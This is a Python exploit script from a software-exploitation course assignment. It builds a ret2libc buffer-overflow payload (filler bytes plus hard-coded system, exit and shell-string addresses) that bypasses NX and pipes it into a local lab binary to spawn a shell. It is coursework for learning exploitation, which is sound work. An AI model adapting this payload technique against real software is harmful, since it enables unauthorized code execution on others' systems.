#!/usr/bin/python

# Steven Comer
# CSC 791: Special Topics in Software Exploitation
# Cycle 5: Protection Bypass of NX with ret2libc
# Contents: Python script to build ret2libc payload and exploit vuln binary
# Modified: 6 May 2016

from struct import pack
from os import system

# addresses
overflow_length = 1028
junk = 'A'*overflow_length
_system=pack("<L",0xb7e3ed00)
_exit=pack("<L",0xb7e32a80)
_shell=pack("<L",0x8048550)

# building the payload
p = junk
p += _system
p += _exit
p += _shell

# write the payload to a file
# this is necessary because of ASCII armoring done by the system
# this armoring is why the libraries have 00 in the address (breaks strcpy)
system("rm -f tempfile > /dev/null 2>&1")
tempfile_handle = open("tempfile","w")
tempfile_handle.write(p + "\n")
tempfile_handle.close()

# execute the program with the payload as an argument
# this technique avoids the EOF read issue caused by having to use a file
system("(cat tempfile ; cat) | ./vuln")
